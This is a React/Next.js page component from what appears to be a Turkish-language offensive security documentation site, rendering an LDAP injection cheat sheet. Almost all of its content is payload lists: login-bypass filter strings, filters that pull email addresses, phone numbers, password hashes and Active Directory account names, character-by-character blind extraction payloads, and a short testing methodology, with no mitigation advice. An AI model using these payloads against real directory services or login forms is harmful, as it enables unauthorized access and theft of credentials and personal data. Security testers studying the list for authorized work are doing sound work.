"use client"

import { motion } from "framer-motion"
import { Database, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"
import { TableOfContents } from "@/components/docs/table-of-contents"

const tocItems = [
  { id: "auth-bypass", title: "Authentication Bypass", level: 2 },
  { id: "info-disclosure", title: "Information Disclosure", level: 2 },
  { id: "blind-ldap", title: "Blind LDAP Injection", level: 2 },
  { id: "special-chars", title: "Special Characters", level: 2 },
]

const fadeIn = {
  initial: { opacity: 0, y: 20 },
  animate: { opacity: 1, y: 0 },
  transition: { duration: 0.4 }
}

const stagger = {
  animate: {
    transition: {
      staggerChildren: 0.1
    }
  }
}

export default function LDAPInjectionPage() {
  return (
    <div className="relative">
      <TableOfContents items={tocItems} />
      <motion.article
        className="prose prose-invert max-w-none"
        initial="initial"
        animate="animate"
        variants={stagger}
      >
        <motion.div variants={fadeIn} className="mb-8">
          <div className="flex items-center gap-2 text-yellow-400 text-sm font-medium mb-4">
            <Database className="w-4 h-4" />
            <span>Injection Zafiyetleri</span>
          </div>
          <h1 className="text-4xl font-bold text-foreground mb-4">LDAP Injection</h1>
          <p className="text-lg text-muted-foreground leading-relaxed">
            LDAP sorgularının manipüle edilmesi ile dizin servislerine yetkisiz erişim.
            Authentication bypass, bilgi sızıntısı ve privilege escalation.
          </p>
        </motion.div>

        <Callout type="info" title="Hedef">
          LDAP genelde Active Directory, OpenLDAP ile kullanılır. Login formları,
          kullanıcı arama ve adres defterleri hedef alınır.
        </Callout>

        <motion.section variants={fadeIn} id="auth-bypass" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-blue-500/10 text-blue-400 text-sm font-mono">01</span>
            Authentication Bypass
          </h2>
          <PayloadList
            title="Login Bypass Payloads"
            initialShow={10}
            payloads={[
              { code: `*`, note: "Wildcard - tüm kayıtlar" },
              { code: `*)(&`, note: "Filter breakout" },
              { code: `*)(uid=*))(|(uid=*`, note: "OR injection" },
              { code: `admin)(|(password=*`, note: "Password filter bypass" },
              { code: `*)(objectClass=*`, note: "Tüm object class'lar" },
              { code: `admin)(&)`, note: "AND true injection" },
              { code: `admin)(|(cn=*`, note: "CN wildcard injection" },
              { code: `*)(uid=admin`, note: "UID injection" },
              { code: `admin)(!(&(1=0`, note: "NOT operator bypass" },
              { code: `*))%00`, note: "Null byte terminator" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="info-disclosure" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-red-500/10 text-red-400 text-sm font-mono">02</span>
            Information Disclosure
          </h2>
          <PayloadList
            title="Data Extraction"
            initialShow={8}
            payloads={[
              { code: `*)(mail=*`, note: "Tüm email adreslerini çek" },
              { code: `*)(telephoneNumber=*`, note: "Telefon numaraları" },
              { code: `*)(userPassword=*`, note: "Password hash'leri" },
              { code: `*)(description=*`, note: "Açıklama alanları" },
              { code: `*)(memberOf=*`, note: "Grup üyelikleri" },
              { code: `*)(objectClass=person)(cn=*`, note: "Tüm kişiler" },
              { code: `*)(objectClass=computer)(cn=*`, note: "Tüm bilgisayarlar" },
              { code: `*)(objectClass=group)(cn=*`, note: "Tüm gruplar" },
              { code: `*)(objectClass=organizationalUnit)(ou=*`, note: "Tüm OU'lar" },
              { code: `*)(sAMAccountName=*`, note: "AD kullanıcı adları" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="blind-ldap" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-yellow-500/10 text-yellow-400 text-sm font-mono">03</span>
            Blind LDAP Injection
          </h2>
          <PayloadList
            title="Boolean-Based Blind"
            initialShow={8}
            payloads={[
              { code: `admin)(|(password=a*`, note: "Password 'a' ile mi başlıyor?" },
              { code: `admin)(|(password=b*`, note: "Password 'b' ile mi başlıyor?" },
              { code: `admin)(|(password=ab*`, note: "İkinci karakter 'b' mi?" },
              { code: `*)(uid=admin)(|(objectClass=*`, note: "admin var mı?" },
              { code: `*)(uid=a*)(|(objectClass=*`, note: "'a' ile başlayan user var mı?" },
              { code: `*)(cn=*admin*)(|(objectClass=*`, note: "CN'de 'admin' geçen kayıt" },
              { code: `*)(description=*password*)(|(objectClass=*`, note: "Description'da 'password' geçen" },
              { code: `*)(mail=*@target.com)(|(objectClass=*`, note: "Belirli domain'deki mailler" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="special-chars" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-purple-500/10 text-purple-400 text-sm font-mono">04</span>
            Special Characters
          </h2>
          <PayloadList
            title="LDAP Meta Characters"
            initialShow={6}
            payloads={[
              { code: `(`, note: "Filter group open" },
              { code: `)`, note: "Filter group close" },
              { code: `|`, note: "OR operator" },
              { code: `&`, note: "AND operator" },
              { code: `!`, note: "NOT operator" },
              { code: `*`, note: "Wildcard" },
              { code: `\\`, note: "Escape character" },
              { code: `%00`, note: "Null byte" },
              { code: `%28 %29`, note: "URL encoded parens" },
              { code: `%2a`, note: "URL encoded wildcard" },
            ]}
          />
        </motion.section>

        <Callout type="tip" title="Test Metodolojisi">
          1. Login formlarında * wildcard deneyin{"\n"}
          2. Kullanıcı arama alanlarında LDAP filter injection yapın{"\n"}
          3. Boolean-based blind ile karakter karakter extraction{"\n"}
          4. Error mesajlarından LDAP yapısını çıkarın{"\n"}
          5. Null byte ile filter truncation deneyin
        </Callout>

        <motion.div variants={fadeIn} className="mt-16 pt-8 border-t border-border/50">
          <div className="flex justify-between items-center">
            <Link
              href="/docs/injection/command"
              className="flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors text-sm"
            >
              <ArrowLeft className="w-4 h-4" />
              Command Injection
            </Link>
            <Link
              href="/docs/injection/nosql"
              className="text-primary hover:text-primary/80 transition-colors text-sm flex items-center gap-2"
            >
              NoSQL Injection
              <ArrowRight className="w-4 h-4" />
            </Link>
          </div>
        </motion.div>
      </motion.article>
    </div>
  )
}
